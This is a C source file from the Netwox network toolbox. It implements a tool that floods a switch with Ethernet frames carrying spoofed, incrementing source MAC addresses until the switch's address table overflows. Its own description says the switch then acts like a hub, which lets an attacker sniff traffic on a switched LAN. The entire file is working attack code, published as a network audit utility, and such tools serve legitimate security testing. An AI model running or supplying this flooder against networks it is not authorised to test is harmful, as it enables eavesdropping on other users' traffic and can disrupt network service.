/*
                                  NETWOX
                             Network toolbox
                Copyright(c) 1999-2012 Laurent CONSTANTIN
                      http://ntwox.sourceforge.net/
                        laurentconstantin@free.fr
                                  -----

  This file is part of Netwox.

  Netwox is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License version 3
  as published by the Free Software Foundation.

  Netwox is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details (http://www.gnu.org/).

------------------------------------------------------------------------
*/

/*-------------------------------------------------------------*/
#include "../netwox.h"

/*-------------------------------------------------------------*/
netwib_conststring t000075_description[] = {
  "This tool sends a lot of fake Ethernet packets. On some old switches,",
  "their table becomes full, and the switch starts behaving like a hub.",
  "It permits to sniff on those switched LAN.",
  NETWOX_DESC_toolpriv_spoof,
  NULL
};
netwox_toolarg t000075_args[] = {
  NETWOX_TOOLARG_OPT_BUF_DEVICE('d', NULL, NULL, NULL),
  NETWOX_TOOLARG_END
};
netwox_tooltreenodetype t000075_nodes[] = {
  NETWOX_TOOLTREENODETYPE_NETAUDIT_ETH,
  NETWOX_TOOLTREENODETYPE_END
};
netwox_tool_info t000075_info = {
  "Fill table of a switch using a flood of Ethernet packets",
  t000075_description,
  "frame, hub, mac",
  t000075_args,
  t000075_nodes,
};

/*-------------------------------------------------------------*/
netwib_err t000075_core(int argc, char *argv[])
{
  netwox_arg *parg;
  netwib_buf device;
  netwib_io *pio;
  netwib_linkhdr linkheader;
  netwib_uint32 ui;
  netwib_buf pkt, data;

  /* obtain parameters */
  netwib_er(netwox_arg_init(argc, argv, &t000075_info, &parg));
  netwib_er(netwox_arg_buf(parg, 'd', &device));

  /* init io */
  netwib_er(netwib_io_init_spoof_link(&device, &pio));

  /* main loop */
  netwib_er(netwib_buf_init_ext_string("Eabcdefghijklmnopqrstuvwxyzabcdefghijklmnopqrstuvwxyz", &data));
  netwib_er(netwib_buf_init_mallocdefault(&pkt));
  linkheader.type = NETWIB_DEVICE_DLTTYPE_ETHER;
  netwib_er(netwib_eth_init_fields(0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
                                 &linkheader.hdr.ether.dst));
  linkheader.hdr.ether.src.b[0] = 0x00;
  linkheader.hdr.ether.src.b[1] = 0x0B;
  linkheader.hdr.ether.type = NETWIB_ETHERHDRTYPE_IP4;
  ui = 0;
  while (NETWIB_TRUE) {
    netwib__debug_ctrlc_pressed_break();
    netwib__buf_reinit(&pkt);
    ui++;
    linkheader.hdr.ether.src.b[2] = netwib_c2_uint32_0(ui);
    linkheader.hdr.ether.src.b[3] = netwib_c2_uint32_1(ui);
    linkheader.hdr.ether.src.b[4] = netwib_c2_uint32_2(ui);
    linkheader.hdr.ether.src.b[5] = netwib_c2_uint32_3(ui);
    netwib_er(netwib_pkt_append_linkdata(&linkheader, &data, &pkt));
    netwib_er(netwib_io_write(pio, &pkt));
  }
  netwib_er(netwib_buf_close(&pkt));

  /* close */
  netwib_er(netwib_io_close(&pio));
  netwib_er(netwox_arg_close(&parg));

  return(NETWIB_ERR_OK);
}
